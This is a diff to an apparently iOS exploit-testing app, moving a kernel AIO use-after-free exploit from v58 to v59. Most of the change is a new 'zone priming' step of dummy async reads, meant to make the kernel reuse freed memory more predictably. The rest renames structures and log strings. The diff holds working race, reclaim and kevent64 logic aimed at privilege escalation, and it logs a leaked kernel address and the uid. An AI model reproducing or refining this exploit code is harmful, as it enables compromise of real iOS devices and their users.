@@ -247,17 +247,20 @@ struct aio_race_state {
     ssize_t return_result;  // v47: aio_return result or aio_read errno (diagnostics)
 };
 
-// v58: Faithful v44 revival — the ONLY architecture that worked on A15.
-// Key design:
+// v59: v58 + zone priming to improve LIFO reliability.
+// Before lio_listio, 4 dummy AIO reads + aio_return prime CPU 42's
+// zone magazine with known entries, pushing stale entries deeper.
+// This makes tcb zfree -> rcbs[0] zalloc more deterministic.
+// Key design (from v44/v58):
 //   1. Racer started AFTER lio_listio (guarantees kevent registration before free)
 //   2. Single file, no F_NOCACHE (match v44 exactly)
 //   3. Wait for reclaim entries to complete before kevent64 (match reference exploit)
 //   4. kevent64 on exploit thread, not racer (match v44)
 //   5. All logging deferred to after kevent64+close(kq)
 
-#define V58_NRECLAIM 8
+#define V59_NRECLAIM 7
 
-struct v58_race_state {
+struct v59_race_state {
     atomic_bool start, stop;
     atomic_int freed;          // 0=spinning, 1=lost, 2=won
     atomic_bool reclaim_done;
@@ -267,7 +270,7 @@ struct v58_race_state {
     ssize_t return_result;
 };
 
-struct v58_state {
+struct v59_state {
     int fd;                    // single file for all AIO operations
     int kq;
     struct kevent64_s kev;
@@ -297,10 +300,10 @@ static void aio_set_thread_affinity(int tag) {
                       (thread_policy_t)&pol, THREAD_AFFINITY_POLICY_COUNT);
 }
 
-// v58 racer: spins aio_return, then reclaims via aio_read on same CPU (LIFO).
+// v59 racer: spins aio_return, then reclaims via aio_read on same CPU (LIFO).
 // kevent64 is NOT called here — it's on the exploit thread (matching v44).
-static void *v58_racer(void *arg) {
-    struct v58_race_state *s = (struct v58_race_state *)arg;
+static void *v59_racer(void *arg) {
+    struct v59_race_state *s = (struct v59_race_state *)arg;
     aio_set_thread_affinity(42);
 
     while (!atomic_load_explicit(&s->start, memory_order_acquire));
@@ -326,11 +329,32 @@ static void *v58_racer(void *arg) {
     return NULL;
 }
 
-// v58: Faithful v44 — lio_listio FIRST, then racer, then wait for reclaim
-// completion, THEN kevent64 on this thread. Single file, no F_NOCACHE.
-static void *v58_exploit_thread(void *arg) {
-    struct v58_state *st = (struct v58_state *)arg;
+// v59: Zone priming + v44 architecture — prime zone magazine, then
+// lio_listio FIRST, racer, wait for reclaim, THEN kevent64 on this thread.
+static void *v59_exploit_thread(void *arg) {
+    struct v59_state *st = (struct v59_state *)arg;
     aio_set_thread_affinity(42);
+
+    // v59: Zone priming — fill CPU 42's zone magazine with known entries
+    // before lio_listio. 4 dummy AIO reads + aio_return ensure the magazine
+    // LIFO stack has our entries at the top, making tcb zfree->rcbs[0] zalloc
+    // more deterministic (LIFO guarantees same-slot reuse).
+    struct aiocb pcbs[4];
+    char pbufs[4][256];
+    for (int i = 0; i < 4; i++) {
+        memset(&pcbs[i], 0, sizeof(pcbs[i]));
+        pcbs[i].aio_fildes = st->fd;
+        pcbs[i].aio_buf = pbufs[i];
+        pcbs[i].aio_nbytes = 1;
+        pcbs[i].aio_offset = 0;
+        pcbs[i].aio_lio_opcode = LIO_READ;
+        pcbs[i].aio_sigevent.sigev_notify = SIGEV_NONE;
+        aio_read(&pcbs[i]);
+    }
+    for (int i = 0; i < 4; i++) {
+        while (aio_error(&pcbs[i]) == EINPROGRESS) usleep(100);
+        aio_return(&pcbs[i]);
+    }
 
     int kq = kqueue();
     if (kq < 0) { st->err = errno; return NULL; }
@@ -347,9 +371,9 @@ static void *v58_exploit_thread(void *arg) {
     tcb.aio_sigevent.sigev_notify = SIGEV_KEVENT;
     tcb.aio_sigevent.sigev_signo = kq;
 
-    struct aiocb rcbs[V58_NRECLAIM];
-    char rbufs[V58_NRECLAIM][8192];
-    for (int i = 0; i < V58_NRECLAIM; i++) {
+    struct aiocb rcbs[V59_NRECLAIM];
+    char rbufs[V59_NRECLAIM][8192];
+    for (int i = 0; i < V59_NRECLAIM; i++) {
         memset(&rcbs[i], 0, sizeof(rcbs[i]));
         rcbs[i].aio_fildes = st->fd;
         rcbs[i].aio_buf = rbufs[i];
@@ -359,20 +383,20 @@ static void *v58_exploit_thread(void *arg) {
         rcbs[i].aio_sigevent.sigev_notify = SIGEV_NONE;
     }
 
-    // v58 KEY: lio_listio BEFORE racer (kevent guaranteed registered)
+    // v59 KEY: prime zone → lio_listio BEFORE racer → reclaim → kevent64
     struct aiocb *ptr = &tcb;
     struct sigevent sig = {};
     sig.sigev_notify = SIGEV_NONE;
     lio_listio(LIO_NOWAIT, &ptr, 1, &sig);
 
     // NOW start racer
-    struct v58_race_state rs = {};
+    struct v59_race_state rs = {};
     rs.trigger = &tcb;
     rs.rcbs = rcbs;
-    rs.nrcbs = V58_NRECLAIM;
+    rs.nrcbs = V59_NRECLAIM;
 
     pthread_t thr;
-    pthread_create(&thr, NULL, v58_racer, &rs);
+    pthread_create(&thr, NULL, v59_racer, &rs);
     atomic_store_explicit(&rs.start, true, memory_order_release);
 
     usleep(500);
@@ -383,7 +407,7 @@ static void *v58_exploit_thread(void *arg) {
     bool reclaimed = atomic_load(&rs.reclaim_done);
     ssize_t ret_result = rs.return_result;
     st->freed = freed;
-    st->reclaimed = reclaimed ? V58_NRECLAIM : 0;
+    st->reclaimed = reclaimed ? V59_NRECLAIM : 0;
     st->return_result = ret_result;
 
     if (freed != 2) {
@@ -419,7 +443,7 @@ static void *v58_exploit_thread(void *arg) {
     }
 
     // Wait for ALL reclaim entries to complete (matching reference exploit)
-    for (int i = 0; i < V58_NRECLAIM; i++)
+    for (int i = 0; i < V59_NRECLAIM; i++)
         while (aio_error(&rcbs[i]) == EINPROGRESS) usleep(500);
 
     // kevent64 on THIS thread (matching v44 and reference exploit)
@@ -442,7 +466,7 @@ static void *v58_exploit_thread(void *arg) {
     }
 
     // Cleanup reclaim entries
-    for (int i = 0; i < V58_NRECLAIM; i++) {
+    for (int i = 0; i < V59_NRECLAIM; i++) {
         if (aio_error(&rcbs[i]) != EINVAL)
             aio_return(&rcbs[i]);
     }
@@ -516,7 +540,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *aioConf = [UIButtonConfiguration filledButtonConfiguration];
     aioConf.baseBackgroundColor = [UIColor systemOrangeColor];
     self.aioUafButton.configuration = aioConf;
-    [self.aioUafButton setTitle:@"AIO UAF v58" forState:UIControlStateNormal];
+    [self.aioUafButton setTitle:@"AIO UAF v59" forState:UIControlStateNormal];
     [self.aioUafButton addTarget:self action:@selector(aioUafTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.aioUafButton];
 
@@ -5902,7 +5926,7 @@ static void *e2_free_and_ool_racer(void *arg) {
         _aioLast = now;
     }
 
-    [self appendLog:@"\n========== AIO UAF v58 (v44 Faithful Revival) =========="];
+    [self appendLog:@"\n========== AIO UAF v59 (v44 + Zone Priming) =========="];
 
     // Disable button to prevent double-tap
     dispatch_async(dispatch_get_main_queue(), ^{
@@ -5914,24 +5938,24 @@ static void *e2_free_and_ool_racer(void *arg) {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
         @autoreleasepool {
 
-    // v58: Diagnostic in Documents (persists across kernel panic / reboot)
+    // v59: Diagnostic in Documents (persists across kernel panic / reboot)
     NSString *docsDir = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
-    NSString *diagPath = [docsDir stringByAppendingPathComponent:@"diag_v58.txt"];
+    NSString *diagPath = [docsDir stringByAppendingPathComponent:@"diag_v59.txt"];
     unlink(diagPath.UTF8String);
 
-    // v58: SINGLE file — all AIO ops use same fd (faithful v44)
-    NSString *aioPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"aio_v58.bin"];
+    // v59: SINGLE file — all AIO ops use same fd (faithful v44)
+    NSString *aioPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"aio_v59.bin"];
     int fd = open(aioPath.UTF8String, O_CREAT | O_RDWR | O_TRUNC, 0644);
     if (fd < 0) {
         [self appendLog:@"FAIL: could not create file"];
         dispatch_async(dispatch_get_main_queue(), ^{
             self.aioUafButton.enabled = YES;
-            [self.aioUafButton setTitle:@"AIO UAF v58" forState:UIControlStateNormal];
+            [self.aioUafButton setTitle:@"AIO UAF v59" forState:UIControlStateNormal];
         });
         return;
     }
     {
-        // 64KB file — enough for 8x 8KB reads
+        // 64KB file — enough for 1x 4KB + 7x 8KB reads
         char fdata[65536];
         memset(fdata, 'V', sizeof(fdata));
         write(fd, fdata, sizeof(fdata));
@@ -5940,19 +5964,19 @@ static void *e2_free_and_ool_racer(void *arg) {
     [self appendLog:[NSString stringWithFormat:@"diag=%@", diagPath]];
 
     uint64_t entryAddr = 0;
-    // ---- Phase A v58: v44 architecture (racer AFTER lio_listio, kevent64 on exploit thread) ----
-    [self appendLog:@"\n--- Phase A v58: lio_listio → racer → reclaim → wait completion → kevent64 ---"];
+    // ---- Phase A v59: v44 architecture (racer AFTER lio_listio, kevent64 on exploit thread) ----
+    [self appendLog:@"\n--- Phase A v59: prime zone → lio_listio → racer → reclaim → wait → kevent64 ---"];
 
     bool phaseA_won = false;
     for (int attempt = 0; attempt < 10; attempt++) {
         [self appendLog:[NSString stringWithFormat:@"  attempt %d/10", attempt + 1]];
 
-        struct v58_state st = {};
+        struct v59_state st = {};
         st.fd = fd;
         strncpy(st.diag_path, diagPath.UTF8String, sizeof(st.diag_path) - 1);
 
         pthread_t thr;
-        pthread_create(&thr, NULL, v58_exploit_thread, &st);
+        pthread_create(&thr, NULL, v59_exploit_thread, &st);
         pthread_join(thr, NULL);
 
         // Read diagnostic file
@@ -6012,8 +6036,8 @@ static void *e2_free_and_ool_racer(void *arg) {
 
     [self appendLog:[NSString stringWithFormat:@"\nWIN: entryAddr=0x%llx", entryAddr]];
 
-    // ---- Phase C v58: Health check ----
-    [self appendLog:@"\n--- Phase C v58: Health check ---"];
+    // ---- Phase C v59: Health check ----
+    [self appendLog:@"\n--- Phase C v59: Health check ---"];
     {
         struct aiocb hc[4];
         char hcbuf[4][256];
@@ -6039,11 +6063,11 @@ cleanup:
     close(fd);
     unlink(aioPath.UTF8String);
     [self appendLog:[NSString stringWithFormat:@"=== uid=%d gid=%d ===", getuid(), getgid()]];
-    [self appendLog:@"========== AIO UAF v58 Complete =========="];
+    [self appendLog:@"========== AIO UAF v59 Complete =========="];
             _aioRunning = 0;
             dispatch_async(dispatch_get_main_queue(), ^{
                 self.aioUafButton.enabled = YES;
-                [self.aioUafButton setTitle:@"AIO UAF v58" forState:UIControlStateNormal];
+                [self.aioUafButton setTitle:@"AIO UAF v59" forState:UIControlStateNormal];
             });
         }  // @autoreleasepool
     });  // dispatch_async
